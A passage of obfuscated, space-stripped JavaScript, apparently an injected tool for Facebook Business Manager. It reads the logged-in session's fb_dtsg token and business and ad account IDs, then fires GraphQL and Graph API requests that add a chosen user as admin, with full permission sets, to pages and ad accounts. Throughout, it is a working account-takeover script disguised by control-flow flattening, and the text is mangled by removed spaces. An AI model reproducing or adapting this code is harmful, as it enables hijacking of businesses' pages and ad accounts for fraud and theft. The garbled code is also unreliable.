                                                                                returnfetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "method", "POST"), "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "av=".concat(_oXDFb.value, "&__usid=6-Ts7ec58cuvdkt%3APs7ec531np81qd%3A0-As7ebuf1u5vugx-RV%3D6%3AF%3D&__user=").concat(_oXDFb.value, "&__a=1&__req=g&__hs=19739.HYP%3Abizweb_comet_pkg.2.1..0.0&dpr=1&__ccg=GOOD&__rev=1010856598&__s=kitb57%3A519jfn%3Abdwnh4&__hsi=7324977209458384554&__dyn=7xeUmxa13xu1syUbFp62-m1FwAxu13w8CewSxu68co2qwJw4BwUx609vCwjE7R046xO2O1VwBwXwEwlU-cw5Mx61vw9m1YwBgao884y1uwoE2sx2ewyxq1izXwae4UaEW2G1NwwwJK2W2K4E5yexfwn82LxiaUcE29wrEjxC3qazo11E2ZwrUdUcobU2cwmo6O1FwgU30w&__csr=gac549TkQn2An5O9tkgRO4njcKRlp4x7KxhVdBnviqhkCjDLpfiBBKui8GjyoSppFeF9KehKCbmVbBjjGez9aDjHCVETxyrBXjDUy-qFkfAADVBIHWh8C8UjiASXKbybDigx12p4DCmi5Hx95hoW8y8KegNaagO7-UmwTyrF1amUybwxDy8G68y3iiiexu7EcXwlFUWEaFUdUjwQxu6UpVA2Wl1qmqu9Gbwyxm5ofooy8Wmdx26U4e5ocEcEkgowkE6u3i02Rm04xo0swEE3NaewDgao1yUiwCgaoZw7dw1RR6Dw0qPE0eSE1eo1eE6qHF03fE28yk0d2SE0q4g1C100bGE0f7E0atE3dDo1987eEgEw2aG1GBo0dMo6l02v8W0kS&__comet_req=11&fb_dtsg=").concat(_YeTFb.value, "&jazoest=25596&lsd=fOD_rtuB5dhWLHmymj9U9i&__bid=403893235343745&__spin_r=1010856598&__spin_b=trunk&__spin_t=1705479158&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=LWIUpdateAdAccountLinkPreferenceMutation&variables=%7B%22input%22%3A%7B%22create_permissions%22%3Atrue%2C%22preference%22%3A%22INSTAGRAM_BACKED_ADS%22%2C%22actor_id%22%3A%22").concat(_oXDFb.value, "%22%2C%22client_mutation_id%22%3A%221%22%7D%7D&server_timestamps=true&doc_id=7267556646604471")), "mode", "cors"), "credentials", "include"));
                                                                                case7: cyBKb = _context2.sent;
                                                                                Q = 0;
                                                                                case9: if (!(Q < 65535)) {
                                                                                        _context2.next = 27;
                                                                                        break;
                                                                                    }
                                                                                _context2.t0 = Q;
                                                                                _context2.next = _context2.t0 === 0 ? 13 : _context2.t0 === 1 ? 15 : _context2.t0 === 2 ? 22 : 25;
                                                                                break;
                                                                                case13: Q = cyBKb.ok ? 1 : 2;
                                                                                return_context2.abrupt("break", 25);
                                                                                case15: Q = 65535;
                                                                                _context2.next = 18;
                                                                                returncyBKb.text();
                                                                                case18: YuvKb = _context2.sent;
                                                                                console.log(YuvKb);
                                                                                sCXh.value = YuvKb;
                                                                                return_context2.abrupt("break", 25);
                                                                                case22: Q = 65535;
                                                                                console.error("ErroroccurredwhilesendingRequest");
                                                                                return_context2.abrupt("break", 25);
                                                                                case25: _context2.next = 9;
                                                                                break;
                                                                                case27: _context2.next = 32;
                                                                                break;
                                                                                case29: _context2.prev = 29;
                                                                                _context2.t1 = _context2.catch(0);
                                                                                console.error(_context2.t1);
                                                                                case32:
                                                                                    case "end":
                                                                                    return_context2.stop();
                                                                            }
                                                                        }
                                                                    }, _callee2, null, [
                                                                        [0, 29]
                                                                    ]);
                                                                }));
                                                                returnfunctionYaIJb() {
                                                                    return_ref35.apply(this, arguments);
                                                                };
                                                            }();
                                                            YaIJb();
                                                        });
                                                        document.body.appendChild(oPhNb);
                                                        oPhNb.style.width = "100%";
                                                        oPhNb.style.height = "30px";
                                                        oPhNb.style.marginBottom = "10px";
                                                        oPhNb.style.backgroundColor = "RED";
                                                        oPhNb.style.color = "white";
                                                        MFck.appendChild(oPhNb);
                                                        varUrpKb = document.createElement("button");
                                                        UrpKb.textContent = "💰ShowAddPeopleToPageFacebookAsAdminINSTASections💰";
                                                        UrpKb.style.display = "none";
                                                        UrpKb.style.width = "70%";
                                                        UrpKb.style.height = "30px";
                                                        UrpKb.style.marginBottom = "10px";
                                                        UrpKb.style.backgroundColor = "Blue";
                                                        UrpKb.style.color = "white";
                                                        varongKb = NaN === NaN;
                                                        UrpKb.addEventListener("click", function() {
                                                            gBHKb.style.display = ongKb ? "none" : "block";
                                                            sKZKb.style.display = ongKb ? "none" : "block";
                                                            MFQKb.style.display = ongKb ? "none" : "block";
                                                            ICKKb.style.display = ongKb ? "none" : "block";
                                                            kENKb.style.display = ongKb ? "none" : "block";
                                                            QojKb.style.display = ongKb ? "none" : "block";
                                                            QIWKb.style.display = ongKb ? "none" : "block";
                                                            ongKb = !ongKb;
                                                            UrpKb.textContent = ongKb ? "💰HideAddPeopleToPageFacebookAsAdminINSTASections💰" : "💰ShowAddPeopleToPageFacebookAsAdminINSTASections💰";
                                                            UrpKb.style.backgroundColor = ongKb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(UrpKb);
                                                        varQojKb = document.createElement("label");
                                                        QojKb.innerText = "PageID:";
                                                        QojKb.style.display = "none";
                                                        MFck.appendChild(QojKb);
                                                        varQIWKb = document.createElement("input");
                                                        QIWKb.placeholder = "EnterPageID";
                                                        QIWKb.style.width = "100%";
                                                        QIWKb.style.marginBottom = "10px";
                                                        QIWKb.style.display = "none";
                                                        MFck.appendChild(QIWKb);
                                                        varsKZKb = document.createElement("label");
                                                        sKZKb.innerText = "BusinessUserID:";
                                                        sKZKb.style.display = "none";
                                                        MFck.appendChild(sKZKb);
                                                        varMFQKb = document.createElement("input");
                                                        MFQKb.placeholder = "EnterbusinessUserID";
                                                        MFQKb.style.width = "100%";
                                                        MFQKb.style.marginBottom = "10px";
                                                        MFQKb.style.display = "none";
                                                        MFck.appendChild(MFQKb);
                                                        varoHTKb = require("CurrentBusinessUser").business_user_id;
                                                        MFQKb.value = oHTKb;
                                                        varICKKb = document.createElement("label");
                                                        ICKKb.innerText = "BusinessID:";
                                                        ICKKb.style.display = "none";
                                                        MFck.appendChild(ICKKb);
                                                        varkENKb = document.createElement("input");
                                                        kENKb.placeholder = "EnterbusinessID";
                                                        kENKb.style.width = "100%";
                                                        kENKb.style.marginBottom = "10px";
                                                        kENKb.style.display = "none";
                                                        MFck.appendChild(kENKb);
                                                        varEzEKb = require("BusinessUnifiedNavigationContext").businessID;
                                                        kENKb.value = EzEKb;
                                                        vargBHKb = document.createElement("button");
                                                        gBHKb.textContent = "AddPeopleonPageFacebookAsAdminonbusinessuser🆕";
                                                        gBHKb.style.margin = "0auto";
                                                        gBHKb.style.padding = "10px20px";
                                                        gBHKb.style.background = "blue";
                                                        gBHKb.style.color = "white";
                                                        gBHKb.style.border = "none";
                                                        gBHKb.style.borderRadius = "5px";
                                                        gBHKb.style.display = "none";
                                                        MFck.appendChild(gBHKb);
                                                        vargVuLb = document.createElement("button");
                                                        gVuLb.textContent = "PleaseWait👩‍💻";
                                                        gVuLb.style.display = "none";
                                                        gVuLb.style.margin = "0auto";
                                                        gVuLb.style.padding = "10px20px";
                                                        gVuLb.style.background = "red";
                                                        gVuLb.style.color = "white";
                                                        gVuLb.style.border = "none";
                                                        gVuLb.style.borderRadius = "5px";
                                                        MFck.appendChild(gVuLb);
                                                        gBHKb.addEventListener("click", function() {
                                                            gBHKb.style.display = "none";
                                                            gVuLb.style.display = "block";
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "av=".concat(_oXDFb.value, "&__usid=6-Ts89a3315otz1n:Ps89a3esurmli:0-As899zump228b-RV=6:F=&__user=").concat(_oXDFb.value, "&__a=1&__req=1v&__hs=19756.HYP:bizweb_comet_pkg.2.1..0.0&dpr=1&__ccg=EXCELLENT&__rev=1011193861&__s=e8bau7:eep7n0:swcm96&__hsi=7331177784173271247&__dyn=7xeUmxa2C6oCdwn8K2abBAqxu59o6C2i5VEdpE6C4UKewSAxam4Eco5S3O2S2q1VwqoqyojzoO4o2vwOwNCwQwCxq1zwCCwjFEK3idwLBG742pofo4S1UxO2yUa8522m3K2y11xmfz87G0FoO12ypUuwg88EeF8pK584HBwFwBgaohzE4y3m2y1bxq1yxJxK48GU8EhAwGK2efK2W1dx6dCxeq4ohzEaE8o4-224U-9K2W2K4E5yeDy-7oc8S2a3WcwMzUkGvwOwKG13y8G19x6bCyVUCfwLCyKbG220UFU2RwrUgU98cpbwCwFg88WqU9E5C1dxW6U98a84e682Dw&__csr=gpMR3QI64j4Mz7hj2cQtd97ns8q99EwwKJn5NYO5_dqjPYBV25QHhdnO9QATiarrjSWHaCIiDSynFQPWFuRWZttGHtJaJbAWl9BGAmJiRF4ihbrizpQqQn_ykFm9gKtVviu4ahpVWyKt5LVFfAyGiZ94FkO5Ay95KhqrF6KtVbUhpm9p4cCyoGENd1mHoCCFUJQUyKGIxy4FppKui8h8N3rGaK9z8kKB-t2kowOuq9CDVVemEymX-JtmQ3u9gyGmVtaVEzxeUGimUiCGi4-GyC58ydxip0DBBDDByp8OaBCuWhomwMAzAeABKuieyoCdgs_yaAydBG78y8Bx6UPF1Vox2U-4HyLxC4EgwAmiEnyA0qNw37E0YRuU6HwzDxZwxN8Z04Vg3NUy4UmwJwSwsA0AU6O2Bu7k1yxe0To426E23DwxBw4xDU0mac0cZ2A9U9R4sk9E6832w9859CcdLBwIfWc0laqrw9d0rK48S9x6580jVDQ1ryE1RU0i-8Ehgk5i02jo3ie02JOc4Sq4Uix5a4hYcwl0Bx62JrVRyd91S1w2G20kdsw0gxAIIFpZ0HChFUc40bFIJ0MPS0wEix20np0eV0aW0l-0SurhE6ylS1nN6F0CmgAWx58wP2o3_wf6047o6maD-aw3n8y4o0Uyqm3aCEGgAwbVVA4U5HDyU0EK0a3wk92m1szFdiw_yFS94w0KUw45w1Oa029a0jB030A1kyFEqw1tu6VU5KqEtDHo0B6Eydy4qt0i980KJ6Dw6Aw1amOQ7U12FU0UZ0fe0re&__comet_req=11&fb_dtsg=").concat(_YeTFb.value, '&jazoest=25493&lsd=DHdTTZWqY-fDDLCSWRB3yE&__aaid=0&__bid=235846589553594&__spin_r=1011193861&__spin_b=trunk&__spin_t=1706922842&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BizKitSettingsBulkAddUserToAssetMutation&variables={"businessID":"').concat(kENKb.value, '","assetID":"').concat(QIWKb.value, '","userIDs":["').concat(MFQKb.value, '"],"taskIDs":["461340961883703","556750461849806","696659004201852","275298030109664","270956550540539","794616964377599","2565488997052663"]}&server_timestamps=true&doc_id=6882312805126257')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(IWxLb) {
                                                                IWxLb.text().then(function(cSoLb) {
                                                                    console.log(cSoLb);
                                                                    sCXh.value = cSoLb;
                                                                    gBHKb.style.display = "block";
                                                                    gVuLb.style.display = "none";
                                                                });
                                                            }).catch(function(ETrLb) {
                                                                console.error(ETrLb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryAddPeopleonAdAccountAsAdminInProgress...⌛");
                                                            sCXh.value = "⌛...TryAddPeopleonAdAccountAsAdminInProgress...⌛";
                                                        });
                                                        document.body.appendChild(gBHKb);
                                                        gBHKb.style.width = "100%";
                                                        gBHKb.style.height = "30px";
                                                        gBHKb.style.marginBottom = "10px";
                                                        gBHKb.style.backgroundColor = "RED";
                                                        gBHKb.style.color = "white";
                                                        MFck.appendChild(gBHKb);
                                                        varYOiLb = document.createElement("button");
                                                        YOiLb.textContent = "💰ShowAddPeopleToAdAccountAsAdminINSTASections💰";
                                                        YOiLb.style.display = "none";
                                                        YOiLb.style.width = "70%";
                                                        YOiLb.style.height = "30px";
                                                        YOiLb.style.marginBottom = "10px";
                                                        YOiLb.style.backgroundColor = "Blue";
                                                        YOiLb.style.color = "white";
                                                        varAQlLb = NaN === NaN;
                                                        YOiLb.addEventListener("click", function() {
                                                            ofSHb.style.display = AQlLb ? "none" : "block";
                                                            ULcLb.style.display = AQlLb ? "none" : "block";
                                                            AokIb.style.display = AQlLb ? "none" : "block";
                                                            UjbIb.style.display = AQlLb ? "none" : "block";
                                                            wNfLb.style.display = AQlLb ? "none" : "block";
                                                            QgVHb.style.display = AQlLb ? "none" : "block";
                                                            siYHb.style.display = AQlLb ? "none" : "block";
                                                            AQlLb = !AQlLb;
                                                            YOiLb.textContent = AQlLb ? "💰HideAddPeopleToAdAccountAsAdminINSTASections💰" : "💰ShowAddPeopleToAdAccountAsAdminINSTASections💰";
                                                            YOiLb.style.backgroundColor = AQlLb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(YOiLb);
                                                        varULcLb = document.createElement("label");
                                                        ULcLb.innerText = "AdaccountID:";
                                                        ULcLb.style.display = "none";
                                                        MFck.appendChild(ULcLb);
                                                        varwNfLb = document.createElement("input");
                                                        wNfLb.placeholder = "EnterAdaccountID";
                                                        wNfLb.style.width = "100%";
                                                        wNfLb.style.marginBottom = "10px";
                                                        wNfLb.style.display = "none";
                                                        MFck.appendChild(wNfLb);
                                                        varYmhIb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                        wNfLb.value = YmhIb;
                                                        varAokIb = document.createElement("label");
                                                        AokIb.innerText = "BusinessUserID:";
                                                        AokIb.style.display = "none";
                                                        MFck.appendChild(AokIb);
                                                        varUjbIb = document.createElement("input");
                                                        UjbIb.placeholder = "EnterbusinessUserID";
                                                        UjbIb.style.width = "100%";
                                                        UjbIb.style.marginBottom = "10px";
                                                        UjbIb.style.display = "none";
                                                        MFck.appendChild(UjbIb);
                                                        varwleIb = require("CurrentBusinessUser").business_user_id;
                                                        UjbIb.value = wleIb;
                                                        varQgVHb = document.createElement("label");
                                                        QgVHb.innerText = "BusinessID:";
                                                        QgVHb.style.display = "none";
                                                        MFck.appendChild(QgVHb);
                                                        varsiYHb = document.createElement("input");
                                                        siYHb.placeholder = "EnterbusinessID";
                                                        siYHb.style.width = "100%";
                                                        siYHb.style.marginBottom = "10px";
                                                        siYHb.style.display = "none";
                                                        MFck.appendChild(siYHb);
                                                        varMdPHb = require("BusinessUnifiedNavigationContext").businessID;
                                                        siYHb.value = MdPHb;
                                                        varofSHb = document.createElement("button");
                                                        ofSHb.textContent = "AddPeopleonadaccountAsAdminonbusinessuser🆕";
                                                        ofSHb.style.margin = "0auto";
                                                        ofSHb.style.padding = "10px20px";
                                                        ofSHb.style.background = "blue";
                                                        ofSHb.style.color = "white";
                                                        ofSHb.style.border = "none";
                                                        ofSHb.style.borderRadius = "5px";
                                                        ofSHb.style.display = "none";
                                                        MFck.appendChild(ofSHb);
                                                        varozFIb = document.createElement("button");
                                                        ozFIb.textContent = "PleaseWait👩‍💻";
                                                        ozFIb.style.display = "none";
                                                        ozFIb.style.margin = "0auto";
                                                        ozFIb.style.padding = "10px20px";
                                                        ozFIb.style.background = "red";
                                                        ozFIb.style.color = "white";
                                                        ozFIb.style.border = "none";
                                                        ozFIb.style.borderRadius = "5px";
                                                        MFck.appendChild(ozFIb);
                                                        ofSHb.addEventListener("click", function() {
                                                            ofSHb.style.display = "none";
                                                            ozFIb.style.display = "block";
                                                            fetch("https://business.facebook.com/api/graphql/", _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "av=".concat(_oXDFb.value, "&__usid=6-Ts997calyfmbw:Ps997cq29qbok:0-As9967w5c89s5-RV=6:F=&__aaid=0&__bid=1460378511455332&__user=").concat(_oXDFb.value, "&__a=1&__req=1i&__hs=19775.HYP:bizweb_comet_pkg.2.1..0.0&dpr=1&__ccg=EXCELLENT&__rev=1011577220&__s=72jq0d:aa394i:l0ygvx&__hsi=7338376420269743361&__dyn=7xeUmxa2C6oCdwn8K2abBAjxu59o2exuq3mq1FxebzEdF8iBxa361twYwJwCwuo6C6EC4UScx60DUcEcpEd89EmwoU9FE4WqbwQzobVqxN0Cm3S1dwu8swEK2y1gwBwXwEwgolzUO1WwamcwgECu7E422a3Gi6rxi1aDwFwBgaohzE4y3m2y1bxq1yxJxK48GU8EhAwGK2efK2W1dx6dCxeq4ohzEaE8o4-224U-9K2W2K4E5yeDy-7oc8S2a3WcwMzUkGvwOwKG13y8G19x6bCyVUCfwLCyKbG220UFU2RwrUgU98cpbwCwFg88WqU9E5C1dxW6U98a84e682Dwt8&__csr=gmhQ2_3IfmDs9MXk_XETlOh7aNql9b9cL9qEyZMVkBvd5iahshnXHnGDt9WWiazujtmBmJV5q8KlDZfFdbJ5vqmy9aySJib89hfBAB9gl-ZV99vJd4rKsJltAWFpk8LCKq9gyRAAAGA9Bybi-qRzuLqJpkmWVpEOp1mQp2poVpvWHgOGyo-vybAzoKXyuBh4VlyALypEhyp9uiLy9HyqAAnAKiiKh1ydHjzWBx6ryQV4rCK8iWZoFGjKrAqDFFem4HAGFp94GWy9UTJp8kzEyuqEnHUCi4Qu8Dm22q-iUV0wUG_KqrDybwBmeAVEKeiyXBBm4-8DVUhjDwxxlqGdjAyElwWxGVoK4dadCzUC4p8pguyk4EKqiiWwHzEC4o8aglyU0kCw5pxleez8kwADV8GbwlO7xicgB1Cl02v8bA2b80J-m8ihFA09cg0gzg0h8G4A5u08kw2jK0DRsP8FFT7sba1iMl1gk9g8qiMHE81zwVwWw9S39zE6i8zo0gFg12C0k60HVU0kwG4k4MC091wd2pi00I0ONs8Gm6pk2x8QU73eEhgk4zbGP1ha5k0y0DIqE4R0k8kdkE0JyvgfU44UK2l0Aiyrcaw2zHbobXba0zEO09Bg5104Jwdm0DA0E4lPG4kf98yjxupa0iQGx5iEFgG1Awvo4-09Aw61wrU1i80mNgcEy2pw1rW5jaKDeAubaEhgkSdg7G260DU4-5j01Li056U0ekU1gVU0sDw2uoa5wso510hCE2JwafBwDOwMw8Yw0gbw5fw1ey8yGa0No0M60nWm09Mw&__comet_req=11&fb_dtsg=").concat(_YeTFb.value, '&jazoest=25234&lsd=7tcW8lIU3yT-82qeHc01f7&__spin_r=1011577220&__spin_b=trunk&__spin_t=1708598905&__jssesw=1&fb_api_caller_class=RelayModern&fb_api_req_friendly_name=BizKitSettingsBulkAddUserToAssetMutation&variables={"businessID":"').concat(siYHb.value, '","assetID":"').concat(wNfLb.value, '","userIDs":["').concat(UjbIb.value, '"],"taskIDs":["864195700451909","151821535410699","610690166001223","186595505260379"]}&server_timestamps=true&doc_id=6882312805126257')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(QAIIb) {
                                                                QAIIb.text().then(function(kwzIb) {
                                                                    console.log(kwzIb);
                                                                    sCXh.value = kwzIb;
                                                                    ofSHb.style.display = "block";
                                                                    ozFIb.style.display = "none";
                                                                });
                                                            }).catch(function(MxCIb) {
                                                                console.error(MxCIb);
                                                                console.log("ErroroccurredwhilesendingRequest");
                                                            });
                                                            console.log("⌛...TryAddPeopleonAdAccountAsAdminInProgress...⌛");
                                                            sCXh.value = "⌛...TryAddPeopleonAdAccountAsAdminInProgress...⌛";
                                                        });
                                                        document.body.appendChild(ofSHb);
                                                        ofSHb.style.width = "100%";
                                                        ofSHb.style.height = "30px";
                                                        ofSHb.style.marginBottom = "10px";
                                                        ofSHb.style.backgroundColor = "RED";
                                                        ofSHb.style.color = "white";
                                                        MFck.appendChild(ofSHb);
                                                        vargttIb = document.createElement("button");
                                                        gttIb.textContent = "💰ShowInstagramToolsadaccountpermission💰";
                                                        gttIb.style.width = "100%";
                                                        gttIb.style.height = "50px";
                                                        gttIb.style.marginBottom = "10px";
                                                        gttIb.style.backgroundColor = "purple";
                                                        gttIb.style.color = "white";
                                                        varIuwIb = NaN === NaN;
                                                        gttIb.addEventListener("click", function() {
                                                            cqnIb.style.display = IuwIb ? "none" : "block";
                                                            IuwIb = !IuwIb;
                                                            gttIb.textContent = IuwIb ? "💰HideInstagramToolsadaccountpermission💰" : "💰ShowInstagramToolsadaccountpermission💰";
                                                            gttIb.style.backgroundColor = IuwIb ? "Gray" : "purple";
                                                        });
                                                        MFck.appendChild(gttIb);
                                                        varcqnIb = document.createElement("button");
                                                        cqnIb.textContent = "💰ShowAdAccountPermissionBusinessFBANDINSTASections💰";
                                                        cqnIb.style.display = "none";
                                                        cqnIb.style.width = "70%";
                                                        cqnIb.style.height = "30px";
                                                        cqnIb.style.marginBottom = "10px";
                                                        cqnIb.style.backgroundColor = "Blue";
                                                        cqnIb.style.color = "white";
                                                        varErqIb = NaN === NaN;
                                                        cqnIb.addEventListener("click", function() {
                                                            ELdJb.style.display = ErqIb ? "none" : "block";
                                                            gNgJb.style.display = ErqIb ? "none" : "block";
                                                            cKaJb.style.display = ErqIb ? "none" : "block";
                                                            wFRIb.style.display = ErqIb ? "none" : "block";
                                                            sCLIb.style.display = ErqIb ? "none" : "block";
                                                            UDOIb.style.display = ErqIb ? "none" : "block";
                                                            wZEJb.style.display = ErqIb ? "none" : "block";
                                                            QUvJb.style.display = ErqIb ? "none" : "block";
                                                            IOjJb.style.display = ErqIb ? "none" : "block";
                                                            MRpJb.style.display = ErqIb ? "none" : "block";
                                                            ErqIb = !ErqIb;
                                                            cqnIb.textContent = ErqIb ? "💰HideCreateAdAccountOnBusinessFBANDINSTASections💰" : "💰ShowCreateAdAccountOnBusinessFBANDINSTASections💰";
                                                            cqnIb.style.backgroundColor = ErqIb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(cqnIb);
                                                        varELdJb = document.createElement("label");
                                                        ELdJb.innerText = "AccessToken:";
                                                        ELdJb.style.display = "none";
                                                        MFck.appendChild(ELdJb);
                                                        vargNgJb = document.createElement("textarea");
                                                        gNgJb.placeholder = "EnterAccessToken:";
                                                        gNgJb.style.width = "100%";
                                                        gNgJb.style.height = "70px";
                                                        gNgJb.style.marginBottom = "10px";
                                                        gNgJb.style.display = "none";
                                                        MFck.appendChild(gNgJb);
                                                        varAIXIb = MJTQb;
                                                        gNgJb.value = AIXIb;
                                                        varcKaJb = document.createElement("label");
                                                        cKaJb.innerText = "AdaccountID:";
                                                        cKaJb.style.display = "none";
                                                        MFck.appendChild(cKaJb);
                                                        varwFRIb = document.createElement("input");
                                                        wFRIb.placeholder = "EnterAdaccountID";
                                                        wFRIb.style.width = "100%";
                                                        wFRIb.style.marginBottom = "10px";
                                                        wFRIb.style.display = "none";
                                                        MFck.appendChild(wFRIb);
                                                        varYGUIb = require("CurrentAdAccountInitialData").AD_ACCOUNT_ID;
                                                        wFRIb.value = YGUIb;
                                                        varsCLIb = document.createElement("label");
                                                        sCLIb.innerText = "BusinessID:";
                                                        sCLIb.style.display = "none";
                                                        MFck.appendChild(sCLIb);
                                                        varUDOIb = document.createElement("input");
                                                        UDOIb.placeholder = "EnterBusinessID:";
                                                        UDOIb.style.width = "100%";
                                                        UDOIb.style.marginBottom = "10px";
                                                        UDOIb.style.display = "none";
                                                        MFck.appendChild(UDOIb);
                                                        varUXBJb = require("BusinessUnifiedNavigationContext").businessID;
                                                        UDOIb.value = UXBJb;
                                                        varwZEJb = document.createElement("label");
                                                        wZEJb.innerText = "MainInstagramPeopleID::";
                                                        wZEJb.style.display = "none";
                                                        MFck.appendChild(wZEJb);
                                                        varQUvJb = document.createElement("input");
                                                        QUvJb.placeholder = "EnterMainInstagramPeopleID:";
                                                        QUvJb.style.width = "100%";
                                                        QUvJb.style.marginBottom = "10px";
                                                        QUvJb.style.display = "none";
                                                        MFck.appendChild(QUvJb);
                                                        varsWyJb = require("CurrentBusinessUser").business_user_id;
                                                        QUvJb.value = sWyJb;
                                                        varMRpJb = document.createElement("button");
                                                        MRpJb.textContent = "AddpeopletoadaccountAsAdminByAccessToken🆕";
                                                        MRpJb.style.margin = "0auto";
                                                        MRpJb.style.padding = "10px20px";
                                                        MRpJb.style.background = "blue";
                                                        MRpJb.style.color = "white";
                                                        MRpJb.style.border = "none";
                                                        MRpJb.style.borderRadius = "5px";
                                                        MRpJb.style.display = "none";
                                                        MFck.appendChild(MRpJb);
                                                        varoTsJb = document.createElement("button");
                                                        oTsJb.textContent = "PleaseWait👩‍💻";
                                                        oTsJb.style.display = "none";
                                                        oTsJb.style.margin = "0auto";
                                                        oTsJb.style.padding = "10px20px";
                                                        oTsJb.style.background = "red";
                                                        oTsJb.style.color = "white";
                                                        oTsJb.style.border = "none";
                                                        oTsJb.style.borderRadius = "5px";
                                                        MFck.appendChild(oTsJb);
                                                        varIOjJb = document.createElement("textarea");
                                                        IOjJb.placeholder = "Responsefromserver2";
                                                        IOjJb.style.width = "100%";
                                                        IOjJb.style.height = "30px";
                                                        IOjJb.style.marginBottom = "10px";
                                                        IOjJb.style.display = "none";
                                                        MFck.appendChild(IOjJb);
                                                        MRpJb.addEventListener("click", function() {
                                                            MRpJb.style.display = "none";
                                                            oTsJb.style.display = "block";
                                                            fetch("https://graph.facebook.com/v17.0/act_".concat(wFRIb.value, "/assigned_users?_flowletID=2200&_triggerFlowletID=2200"), _defineProperty(_defineProperty(_defineProperty(_defineProperty(_defineProperty({}, "headers", _defineProperty({}, "content-type", "application/x-www-form-urlencoded")), "body", "access_token=".concat(gNgJb.value, "&user=").concat(QUvJb.value, '&tasks=["MANAGE"]')), "method", "POST"), "mode", "cors"), "credentials", "include")).then(function(kQmJb) {
                                                                returnkQmJb.text();
                                                            }).then(function(MpoGb) {
                                                                IOjJb.value = MpoGb;
                                                                varR = 0;
                                                                while (R < 65535) {
                                                                    switch (R) {
                                                                        case0: R = MpoGb.toLowerCase().includes("failure") ? 1 : 2;
                                                                        break;
                                                                        case1: R = 65535; {
                                                                            console.log("❌Failed-فشل❌");
                                                                            IOjJb.value = "❌Failed-فشل❌";
                                                                            MRpJb.style.display = "block";
                                                                            oTsJb.style.display = "none";
                                                                        }
                                                                        break;
                                                                        case2: R = 65535;
                                                                        varS = 0;
                                                                        while (S < 65535) {
                                                                            switch (S) {
                                                                                case0: S = MpoGb.toLowerCase().includes("success") ? 1 : 2;
                                                                                break;
                                                                                case1: S = 65535; {
                                                                                    console.log("✅Success-نجح✅");
                                                                                    IOjJb.value = "✅Success-نجح✅";
                                                                                    MRpJb.style.display = "block";
                                                                                    oTsJb.style.display = "none";
                                                                                }
                                                                                break;
                                                                                case2: S = 65535; {
                                                                                    IOjJb.value = MpoGb;
                                                                                    MRpJb.style.display = "block";
                                                                                    oTsJb.style.display = "none";
                                                                                }
                                                                                break;
                                                                            }
                                                                        }
                                                                        break;
                                                                    }
                                                                }
                                                            }).catch(function(kolGb) {
                                                                console.error(kolGb);
                                                                IOjJb.value = "❌ErroroccurredwhilesendingRequest❌";
                                                                MRpJb.style.display = "block";
                                                                oTsJb.style.display = "none";
                                                            });
                                                        });
                                                        varEjcGb = document.createElement("button");
                                                        EjcGb.textContent = "💰ShowGetInstaUserIDANDName💰";
                                                        EjcGb.style.display = "none";
                                                        EjcGb.style.width = "50%";
                                                        EjcGb.style.height = "30px";
                                                        EjcGb.style.marginBottom = "10px";
                                                        EjcGb.style.backgroundColor = "Blue";
                                                        EjcGb.style.color = "white";
                                                        varglfGb = NaN === NaN;
                                                        EjcGb.addEventListener("click", function() {
                                                            AgWFb.style.display = glfGb ? "none" : "block";
                                                            ciZFb.style.display = glfGb ? "none" : "block";
                                                            EDPGb.style.display = glfGb ? "none" : "block";
                                                            YyGGb.style.display = glfGb ? "none" : "block";
                                                            glfGb = !glfGb;
                                                            EjcGb.textContent = glfGb ? "💰HideGetInstaUserIDANDName💰" : "💰ShowGetInstaUserIDANDName💰";
                                                            EjcGb.style.backgroundColor = glfGb ? "Gray" : "Blue";
                                                        });
                                                        MFck.appendChild(EjcGb);
                                                        varAgWFb = document.createElement("label");
                                                        AgWFb.innerText = "InstagramUserID:";
                                                        AgWFb.style.display = "none";
                                                        MFck.appendChild(AgWFb);
                                                        varciZFb = document.createElement("input");
                                                        ciZFb.placeholder = "FailedToGetInstagramUSERID❌";
                                                        ciZFb.style.display = "none";
                                                        ciZFb.style.width = "100%";
                                                        ciZFb.style.height = "30px";
                                                        ciZFb.style.marginBottom = "10px";
                                                        MFck.appendChild(ciZFb);
                                                        varcCMGb = require("CurrentUserInitialData").USER_ID;
                                                        ciZFb.value = cCMGb;
                                                        varEDPGb = document.createElement("label");
                                                        EDPGb.innerText = "InstagramUserName:";
                                                        EDPGb.style.display = "none";
                                                        MFck.appendChild(EDPGb);
                                                        varYyGGb = document.createElement("input");
                                                        YyGGb.placeholder = "FailedToGetInstagramUSERName❌";
                                                        YyGGb.style.display = "none";
                                                        YyGGb.style.width = "100%";
                                                        YyGGb.style.height = "30px";
                                                        YyGGb.style.marginBottom = "10px";
                                                        MFck.appendChild(YyGGb);
                                                        varAAJGb = require("CurrentUserInitialData").NAME;
                                                        YyGGb.value = AAJGb;
                                                        varUvAGb = document.createElement("button");
                                                        UvAGb.textContent = "💰ShowFacebookTools💰";
                                                        UvAGb.style.width = "100%";
                                                        UvAGb.style.height = "50px";
                                                        UvAGb.style.marginBottom = "10px";
                                                        UvAGb.style.backgroundColor = "Blue";
                                                        UvAGb.style.color = "white";
                                                        varwxDGb = NaN === NaN;
                                                        UvAGb.addEventListener("click", function() {
                                                            QsuGb.style.display = wxDGb ? "none" : "block";
                                                            wxDGb = !wxDGb;
                                                            UvAGb.textContent = wxDGb ? "💰HideFacebookTools💰" : "💰ShowFacebookTools💰";
                                                            UvAGb.style.backgroundColor = wxDGb ? "Gray" : "Blue";
                                                            sCXh.style.display = wxDGb ? "none" : "block";
                                                        });
